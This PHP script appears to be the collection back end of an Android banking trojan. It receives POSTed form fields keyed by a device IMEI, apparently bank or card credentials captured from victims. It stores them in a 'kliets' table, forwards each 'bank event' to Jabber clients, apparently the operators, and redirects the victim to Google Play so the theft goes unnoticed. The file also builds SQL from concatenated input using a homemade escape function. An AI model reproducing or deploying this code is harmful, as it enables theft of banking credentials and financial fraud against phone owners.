<?php

include '../../db.php';
include '../../admin/func.php';

    # $_GET['p'] = '000000011111222';
    # $_POST['field1'] = 'test1';
    # $_POST['field2'] = 'test2';
    # $_POST['field3'] = 'test3';

    function mysql_escape_mimic($inp) { 
        if(is_array($inp)) 
            return array_map(__METHOD__, $inp); 

        if(!empty($inp) && is_string($inp)) { 
            return str_replace(array('\\', "\0", "\n", "\r", "'", '"', "\x1a"), array('\\\\', '\\0', '\\n', '\\r', "\\'", '\\"', '\\Z'), $inp); 
        } 

        return $inp; 
    } 
    
    if(!empty($_GET['p']) && !empty($_POST)) {
        
        global $mysqli;
        
        $error = false;
        $sc = 0;
        
        for($i=1; $i < 5; $i++) {
            if(((strlen($_POST['field' . $i]) == 1) && in_array(intval(strlen($_POST['field' . $i])), array(1,2,3,4,5,6,7,8)))) {
                $sc += 1;   
            }if(
                isset($_POST['field' . $i]) && 
                !((strlen($_POST['field' . $i]) == 1) && in_array(intval(strlen($_POST['field' . $i])), array(1,2,3,4,5,6,7,8))) && 
                strlen($_POST['field' . $i]) < 2
            ) { $error = true; }
        }
        
        if($sc > 1) {
            $error = true;
        }
        
        if($error == false) {
            $IMEI = mysql_escape_mimic($_GET['p']);
            $info = array(
                'field1' => mysql_escape_mimic($_POST['field1']),
                'field2' => mysql_escape_mimic($_POST['field2']),
                'field3' => mysql_escape_mimic($_POST['field3']),
                'field4' => mysql_escape_mimic($_POST['field4']),
                'field5' => mysql_escape_mimic($_POST['field5']),
                'field6' => mysql_escape_mimic($_POST['field6']),
                'field7' => mysql_escape_mimic($_POST['field7']),
                'field8' => mysql_escape_mimic($_POST['field8']),
                'field9' => mysql_escape_mimic($_POST['field9']),
                'field10' => mysql_escape_mimic($_POST['field10']),
                'field11' => mysql_escape_mimic($_POST['field11']),
                'field12' => mysql_escape_mimic($_POST['field12']),
                'field13' => mysql_escape_mimic($_POST['field13']),
                'field14' => mysql_escape_mimic($_POST['field14']),
                'field15' => mysql_escape_mimic($_POST['field15']),
                'field16' => mysql_escape_mimic($_POST['field16']),
                'field17' => mysql_escape_mimic($_POST['field17']),
                );
            
            $infoForm = $info['field1'].":".$info['field2'].":".$info['field3'].":".$info['field4'].":".$info['field5'].":".$info['field6'].":".$info['field7'].":".$info['field8'].":".$info['field9'].":".$info['field10'].":".$info['field11'].":".$info['field12'].":".$info['field13'].":".$info['field14'].":".$info['field15'].":".$info['field16'].":".$info['field17'];
            //var_dump($info);
            $update_info_sql = "UPDATE `kliets` SET `info` = CONCAT(`info`, '$infoForm\n') WHERE IMEI = '$IMEI'";
            //var_dump($update_info_sql);
            $mysqli->query($update_info_sql);

            # send dedicaded event to jabber clients
            if (check_imei_event($IMEI, $mysqli)){
               send_jabber_event('dedicated_event', $IMEI.":bank event ".$infoForm, $mysqli);
            }
            send_jabber_event('bank_event', $IMEI.":bank event ".$infoForm, $mysqli);

            header( 'Location: https://play.google.com/apps', true, 301 );
            exit();
        }
        
    }
    
?>

